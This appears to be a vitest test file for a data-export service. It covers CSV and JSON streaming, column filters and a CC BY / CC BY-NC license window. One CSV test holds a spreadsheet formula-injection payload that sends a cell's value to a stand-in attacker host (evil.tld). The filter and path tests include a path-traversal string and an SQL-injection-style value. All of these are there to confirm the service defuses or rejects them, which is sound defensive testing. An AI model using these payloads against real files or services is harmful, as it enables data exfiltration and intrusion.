import { env } from 'cloudflare:test'
import { drizzle } from 'drizzle-orm/d1'
import { beforeAll, describe, expect, it } from 'vitest'

import * as schema from '~~/server/db/schema'
import { asOfLicense, licenseWindowStart, rowLicense, withLicense } from '~~/shared/utils/license'
import { PointInTimeError } from '../server/utils/terminal-asof'
import { contentHash, contentHashOfText } from '../server/pipeline/contracts'
import { insertRows } from '../server/pipeline/store'
import {
  EXPORT_PAGE_SIZE,
  EXPORT_TABLES,
  collect,
  csvCell,
  csvChunks,
  csvLine,
  defuseFormula,
  exportFilter,
  exportTable,
  historyRule,
  jsonChunks,
  jsonEnvelopeChunks,
  licenseHeaders,
  licenseWindow,
  parseExportPath,
  parseExportQuery,
  windowOf,
  sampleOf,
  SAMPLE_ROWS,
  streamOf,
  WITHDRAWN_EXPORTS,
} from '../server/utils/terminal-export'

// Bulk exports against a real D1: every table has provenance columns, the
// CSV is RFC 4180, the JSON parses back to the same rows, and a table larger
// than one page streams whole.

const db = drizzle(env.DB, { schema })

const PROV = {
  source_url: 'https://docs.x.ai/developers/models.md',
  fetched_at: '2026-09-07T10:00:01.000Z',
}

function priceEntity(slug: string, input: number) {
  const payload = {
    provider: 'xai',
    model_slug: slug,
    tier: 'standard',
    context_window: '500k',
    input_per_mtok: input,
    cached_input_per_mtok: null,
    output_per_mtok: input * 3,
    currency: 'USD',
    effective_from: null,
    effective_until: null,
    notes: 'has a comma, and "quotes"',
  }
  return {
    source_id: 'xai-models-md',
    entity_key: `model:xai:${slug}:standard`,
    entity_type: 'model',
    provider: 'xai',
    snapshot_id: 'xai-models-md:2026-09-07T10:00:01.000Z',
    content_hash: contentHash(payload),
    payload: JSON.stringify(payload),
    first_seen_at: PROV.fetched_at,
    ...PROV,
  }
}

beforeAll(async () => {
  await insertRows(db, 'snapshots', [
    {
      id: 'xai-models-md:2026-09-07T10:00:01.000Z',
      source_id: 'xai-models-md',
      content_hash: contentHashOfText('x'),
      raw_key: 'raw/xai-models-md/2026-09-07T10:00:01.000Z.md',
      http_status: 200,
      bytes: 1,
      ...PROV,
    },
  ])
  // More rows than one page, so the stream has to keep going.
  await insertRows(
    db,
    'entities',
    Array.from({ length: EXPORT_PAGE_SIZE + 5 }, (_, i) =>
      priceEntity(`grok-${String(i).padStart(3, '0')}`, i),
    ),
  )
  await insertRows(db, 'source_runs', [
    {
      id: 'survey:xai-models-md:2026-09-07T10:00:00.000Z',
      scope: 'survey',
      source_id: 'xai-models-md',
      started_at: '2026-09-07T10:00:00.000Z',
      status: 'baseline',
      detail: null,
      snapshot_id: 'xai-models-md:2026-09-07T10:00:01.000Z',
      added: 0,
      removed: 0,
      modified: 0,
      source_url: PROV.source_url,
    },
  ])
})

describe('the table registry', () => {
  it('serves exactly these tables and nothing else', () => {
    expect(Object.keys(EXPORT_TABLES)).toEqual([
      'snapshots',
      'prices_latest',
      'jobs_open',
      'incidents',
      'disclosures',
      'disclosure_timelines',
      'filers',
      'revenue_facts',
      'prospectus_statements',
      'prospectus_commitments',
      'prospectus_concentration',
      'prospectus_shares',
      'prospectus_risk_factors',
      'changes',
      'archived_prices',
      'archived_hiring',
      'archive_captures',
      'alerts',
      'claim_readings',
      'claim_verdicts',
      'track_record_candidates',
      'track_record_verdicts',
      'recipe_observations',
      'filed_facts',
      'exposure_quarters',
      'source_runs',
      'entity_securities',
      'entity_identifiers',
    ])
    expect(exportTable('entities')).toBeNull()
    expect(exportTable('rankings_daily')).toBeNull()
    expect(WITHDRAWN_EXPORTS.rankings_daily).toMatch(/competing free API/)
    expect(exportTable('constructor')).toBeNull()
    expect(exportTable('prices_latest')!.name).toBe('prices_latest')
  })

  it('reads table and format off the path, since the router cannot split a segment', () => {
    expect(parseExportPath('/export/prices_latest.json?x=1')).toEqual({
      name: 'prices_latest',
      format: 'json',
    })
    expect(parseExportPath('/export/alerts.csv')).toEqual({ name: 'alerts', format: 'csv' })
    expect(parseExportPath('/export/alerts.txt')).toBeNull()
    expect(parseExportPath('/export/')).toBeNull()
    // A traversal spelling parses to a name the registry has never heard of.
    expect(exportTable(parseExportPath('/export/../etc.csv')!.name)).toBeNull()
  })

  it('always ends with the provenance columns — source_runs with its honest substitute', () => {
    for (const [name, table] of Object.entries(EXPORT_TABLES)) {
      const tail = table.columns.slice(-2)
      if (name === 'source_runs') {
        expect(table.columns).toContain('source_url')
        expect(table.columns).toContain('started_at')
        expect(table.columns).not.toContain('fetched_at')
      } else if (name === 'entity_securities') {
        // Hand-checked rows, not fetches: the day each was checked against its source.
        expect(tail).toEqual(['source_url', 'checked_on'])
      } else {
        expect(tail, name).toEqual(['source_url', 'fetched_at'])
      }
    }
  })
})

describe('CSV', () => {
  it('quotes per RFC 4180 and leaves plain values bare', () => {
    expect(csvCell('plain')).toBe('plain')
    expect(csvCell(2.5)).toBe('2.5')
    expect(csvCell(null)).toBe('')
    expect(csvCell('a, b')).toBe('"a, b"')
    expect(csvCell('say "hi"')).toBe('"say ""hi"""')
    expect(csvCell('two\nlines')).toBe('"two\nlines"')
    expect(csvLine(['a', null, 1])).toBe('a,,1\r\n')
  })

  // Job titles, incident titles and judge headlines are not ours, and this
  // file is meant to be opened in a spreadsheet — where a leading =, +, @ or
  // - is code. `=HYPERLINK("https://x?"&A1,"x")` exfiltrates the row on open.
  it('defuses cells a spreadsheet would execute, and leaves numbers alone', () => {
    expect(csvCell('=HYPERLINK("https://evil.tld?d="&A1,"x")')).toBe(
      '"\'=HYPERLINK(""https://evil.tld?d=""&A1,""x"")"',
    )
    expect(csvCell('+1-555-0100')).toBe("'+1-555-0100")
    expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)")
    expect(csvCell('\t=cmd')).toBe("'\t=cmd")
    expect(csvCell('-- a note')).toBe("'-- a note")

    // Data that merely starts with a minus is data.
    expect(csvCell(-12.5)).toBe('-12.5')
    expect(csvCell('-3.5e4')).toBe('-3.5e4')
    expect(defuseFormula('Senior Engineer')).toBe('Senior Engineer')
  })

  it('streams a header line then every row, across page boundaries', async () => {
    const table = exportTable('prices_latest')!
    const text = await collect(csvChunks(db, table))
    const lines = text.split('\r\n').filter(Boolean)
    expect(lines[0]).toBe(table.columns.join(','))
    expect(lines).toHaveLength(EXPORT_PAGE_SIZE + 5 + 1)
    // Flattened payload columns sit between the key columns and provenance.
    const cols = table.columns
    const first = lines[1]!.split(',')
    expect(first[cols.indexOf('entity_key')]).toBe('model:xai:grok-000:standard')
    expect(first[cols.indexOf('model_slug')]).toBe('grok-000')
    expect(first[cols.indexOf('input_per_mtok')]).toBe('0')
    expect(first.at(-1)).toBe(PROV.fetched_at)
    expect(first.at(-2)).toBe(PROV.source_url)
    expect(lines[1]).toContain('"has a comma, and ""quotes"""')
  })

  it('an empty table is a header alone', async () => {
    const text = await collect(csvChunks(db, exportTable('alerts')!))
    expect(text).toBe(`${exportTable('alerts')!.columns.join(',')}\r\n`)
  })
})

describe('JSON', () => {
  it('parses back to one object per row with every column present', async () => {
    const rows = JSON.parse(await collect(jsonChunks(db, exportTable('prices_latest')!))) as Record<
      string,
      unknown
    >[]
    expect(rows).toHaveLength(EXPORT_PAGE_SIZE + 5)
    expect(Object.keys(rows[0]!)).toEqual(exportTable('prices_latest')!.columns)
    expect(rows[0]).toMatchObject({ model_slug: 'grok-000', output_per_mtok: 0, ...PROV })
    expect(rows[0]!.cached_input_per_mtok).toBeNull()
  })

  it('an empty table is an empty array', async () => {
    expect(JSON.parse(await collect(jsonChunks(db, exportTable('changes')!)))).toEqual([])
    const runs = JSON.parse(await collect(jsonChunks(db, exportTable('source_runs')!)))
    expect(runs).toHaveLength(1)
    expect(runs[0]).toMatchObject({ status: 'baseline', source_url: PROV.source_url })
  })
})

describe('filters', () => {
  it('narrows a table by a declared column, and refuses anything else', async () => {
    const recipes = exportTable('recipe_observations')!
    const ok = exportFilter(recipes, { recipe_id: 'ramp-ai-index' })
    expect('where' in ok && ok.where).toBeTruthy()
    expect(exportFilter(recipes, {})).toEqual({ where: undefined })
    expect(exportFilter(recipes, { recipe: 'x' })).toEqual({
      error: 'recipe_observations cannot be filtered by recipe. It accepts recipe_id',
    })
    expect(exportFilter(recipes, { recipe_id: "x' or 1=1" })).toMatchObject({
      error: expect.stringMatching(/one id/),
    })
    expect(exportFilter(exportTable('alerts')!, { x: '1' })).toEqual({
      error: 'alerts cannot be filtered by x',
    })
    // An empty recipe table filters to an empty export, not an error.
    const rows = JSON.parse(
      await collect(jsonChunks(db, recipes, 'where' in ok ? ok.where : undefined)),
    )
    expect(rows).toEqual([])
  })
})

describe('what the exports leave out', () => {
  it('serves no OpenRouter ranking row through the change log', async () => {
    const change = (id: string, entity_type: string) => ({
      id,
      entity_key: `${entity_type}:x:${id}`,
      entity_type,
      provider: 'openai',
      change_type: 'added',
      before_hash: null,
      after_hash: contentHash({}),
      before_json: null,
      after_json: '{}',
      detected_at: '2026-09-07T10:00:02.000Z',
      ...PROV,
    })
    await insertRows(db, 'changes', [change('c-rank', 'ranking'), change('c-job', 'job')])
    const changes = exportTable('changes')!
    const rows = JSON.parse(await collect(jsonChunks(db, changes))) as { id: string }[]
    expect(rows.map((r) => r.id)).toEqual(['c-job'])
    expect(await changes.count(db)).toBe(1)
  })
})

describe('samples', () => {
  it('cut a table to its first rows in export order, with the same columns', async () => {
    const prices = sampleOf(exportTable('prices_latest')!)
    const rows = JSON.parse(await collect(jsonChunks(db, prices))) as Record<string, unknown>[]
    expect(rows).toHaveLength(SAMPLE_ROWS)
    expect(Object.keys(rows[0]!)).toEqual(prices.columns)
    expect(rows[0]!.model_slug).toBe('grok-000')
    expect(await prices.count(db)).toBe(SAMPLE_ROWS)
    expect(prices.filters).toBeUndefined()
  })
})

describe('entity_securities', () => {
  it('is served from code, every row sourced', async () => {
    const table = exportTable('entity_securities')!
    const rows = JSON.parse(await collect(jsonChunks(db, table))) as Record<string, unknown>[]
    expect(rows.length).toBe(await table.count(db))
    for (const row of rows) {
      expect(Object.keys(row)).toEqual(table.columns)
      expect(row.source_url).toMatch(/^https:\/\//)
    }
  })
})

describe('streamOf', () => {
  it('yields the same bytes the generator produced', async () => {
    const stream = streamOf(csvChunks(db, exportTable('snapshots')!))
    const text = await new Response(stream).text()
    expect(text.split('\r\n')[0]).toBe(exportTable('snapshots')!.columns.join(','))
    expect(text).toContain('raw/xai-models-md/2026-09-07T10:00:01.000Z.md')
  })
})

describe('the license window', () => {
  // Fixed instants, so the window never moves under the test.
  const FROM = '2026-09-08'

  function incident(id: string, started_at: string | null, first_seen_at: string) {
    const payload = { incident_id: id, title: `Incident ${id}`, started_at }
    return {
      source_id: 'anthropic-status',
      entity_key: `incident:anthropic:${id}`,
      entity_type: 'incident',
      provider: 'anthropic',
      snapshot_id: 'xai-models-md:2026-09-07T10:00:01.000Z',
      content_hash: contentHash(payload),
      payload: JSON.stringify(payload),
      first_seen_at,
      source_url: 'https://status.claude.com/history.atom',
      fetched_at: first_seen_at,
    }
  }

  beforeAll(async () => {
    await insertRows(db, 'entities', [
      // Old, and published before the split: CC BY for good.
      incident('a-old', '2026-01-01T00:00:00Z', '2026-09-07T10:00:01.000Z'),
      // Old, and first published after the split: CC BY-NC once outside the window.
      incident('b-old-late', '2026-01-02T00:00:00Z', '2026-12-01T00:00:00.000Z'),
      incident('c-new', '2026-09-20T00:00:00Z', '2026-09-20T00:00:01.000Z'),
      // No start in the feed: dated by when we first stored it.
      incident('d-undated', null, '2026-09-21T00:00:00.000Z'),
    ])
  })

  it('states the window from today, 90 days back, as a day', () => {
    expect(licenseWindowStart(new Date('2026-11-04T12:00:00Z'))).toBe('2026-08-06')
    expect(rowLicense('2026-09-01', '2026-12-01T00:00:00Z', '2026-08-06').id).toBe('CC-BY-4.0')
    expect(rowLicense('2026-01-01', '2026-11-03T23:59:59Z', '2026-08-06').id).toBe('CC-BY-4.0')
    expect(rowLicense('2026-01-01', '2026-11-04T00:00:00Z', '2026-08-06').id).toBe('CC-BY-NC-4.0')
  })

  it('puts the split beside every API payload, and labels an old as_of CC BY-NC', () => {
    const now = new Date('2026-11-04T12:00:00Z')
    expect(withLicense({ as_of: 'x' }, now)).toMatchObject({
      as_of: 'x',
      license: {
        recent: { id: 'CC-BY-4.0', days: 90, from: '2026-08-06' },
        older: { id: 'CC-BY-NC-4.0', published_from: '2026-11-04' },
        terms: '/license',
      },
    })
    expect(withLicense(null, now)).toBeNull()
    expect(withLicense([1], now)).toEqual([1])
    expect(asOfLicense('2026-08-05T23:59:59.000Z', now)).toBe('CC-BY-NC-4.0')
    expect(asOfLicense('2026-08-06T00:00:00.000Z', now)).toBe('CC-BY-4.0')
  })

  it('cuts a time-indexed table in SQL, on its own date column', async () => {
    const snapshots = exportTable('snapshots')!
    const rule = historyRule('snapshots')
    expect(await collect(csvChunks(db, windowOf(snapshots, rule, FROM)))).toBe(
      `${snapshots.columns.join(',')}\r\n`,
    )
    const kept = JSON.parse(await collect(jsonChunks(db, windowOf(snapshots, rule, '2026-09-07'))))
    expect(kept).toHaveLength(1)
  })

  it('cuts an entity view row by row, resuming across pages', async () => {
    const incidents = exportTable('incidents')!
    const recent = windowOf(incidents, historyRule('incidents'), FROM)
    const all = JSON.parse(await collect(jsonChunks(db, recent))) as { entity_key: string }[]
    expect(all.map((r) => r.entity_key)).toEqual([
      'incident:anthropic:c-new',
      'incident:anthropic:d-undated',
    ])
    // One row a page: each page skips the old rows before it.
    const first = await recent.page(db, null, 1)
    const second = await recent.page(db, first.at(-1)!, 1)
    expect([...first, ...second].map((r) => r.entity_key)).toEqual(all.map((r) => r.entity_key))
    expect(await recent.page(db, second.at(-1)!, 1)).toEqual([])
  })

  it('serves every row behind history=full, each labeled with its license', async () => {
    const incidents = exportTable('incidents')!
    const window = licenseWindow('incidents', incidents, { history: 'full' }, FROM)
    expect(window).toMatchObject({ split: true, windowed: false })
    const rows = JSON.parse(await collect(jsonChunks(db, window.table))) as Record<
      string,
      unknown
    >[]
    expect(Object.fromEntries(rows.map((r) => [r.entity_key, r.license]))).toEqual({
      'incident:anthropic:a-old': 'CC-BY-4.0',
      'incident:anthropic:b-old-late': 'CC-BY-NC-4.0',
      'incident:anthropic:c-new': 'CC-BY-4.0',
      'incident:anthropic:d-undated': 'CC-BY-4.0',
    })
    expect(Object.keys(rows[0]!)).toEqual(window.table.columns)
    const csv = await collect(csvChunks(db, window.table))
    expect(csv.split('\r\n')[0]).toContain(',license,source_url,fetched_at')

    const headers = licenseHeaders(window)
    expect(headers.Link).toContain('https://creativecommons.org/licenses/by-nc/4.0/')
    expect(headers['X-License']).toMatch(/^CC-BY-NC-4\.0 for rows dated before 2026-09-08/)
  })

  it('wraps a full-history JSON download in its license', async () => {
    const window = licenseWindow('incidents', exportTable('incidents')!, { history: 'full' }, FROM)
    const body = JSON.parse(
      await collect(
        jsonEnvelopeChunks(db, window.table, undefined, { table: 'incidents', license: { x: 1 } }),
      ),
    ) as { table: string; license: unknown; rows: unknown[] }
    expect(body.table).toBe('incidents')
    expect(body.license).toEqual({ x: 1 })
    expect(body.rows).toHaveLength(4)
  })

  it('serves the window by default and says so, and leaves a whole table whole', () => {
    const recent = licenseWindow('changes', exportTable('changes')!, {}, FROM)
    expect(recent).toMatchObject({ windowed: true, split: false })
    expect(licenseHeaders(recent)).toMatchObject({
      'X-License': 'CC-BY-4.0',
      'X-History': expect.stringContaining('history=full'),
    })
    const prices = exportTable('prices_latest')!
    for (const history of [undefined, 'full'] as const) {
      const window = licenseWindow('prices_latest', prices, { history }, FROM)
      expect(window.table).toBe(prices)
      expect(licenseHeaders(window)['X-History']).toBeUndefined()
    }
  })

  it('refuses an as_of before the window unless history=full, and labels a whole table rebuilt then', () => {
    const old = '2026-09-01T00:00:00.000Z'
    expect(() => licenseWindow('changes', exportTable('changes')!, { as_of: old }, FROM)).toThrow(
      PointInTimeError,
    )
    expect(
      licenseWindow('changes', exportTable('changes')!, { as_of: old, history: 'full' }, FROM)
        .split,
    ).toBe(true)
    const prices = licenseWindow(
      'prices_latest',
      exportTable('prices_latest')!,
      { as_of: old },
      FROM,
    )
    expect(prices.split).toBe(true)
    expect(prices.table.columns).toContain('license')
    const recent = '2026-09-10T00:00:00.000Z'
    expect(
      licenseWindow('changes', exportTable('changes')!, { as_of: recent }, FROM).windowed,
    ).toBe(true)
  })

  it('reads history off the query, recent or full, and refuses anything else', () => {
    expect(parseExportQuery({})).toEqual({})
    expect(parseExportQuery({ history: 'full' })).toEqual({ history: 'full' })
    expect(() => parseExportQuery({ history: 'all' })).toThrow(/recent \(the default\) or full/)
    // exportFilter leaves it to the window, as it leaves as_of to ExportTable.at.
    expect(exportFilter(exportTable('changes')!, { history: 'full' })).toEqual({ where: undefined })
  })
})
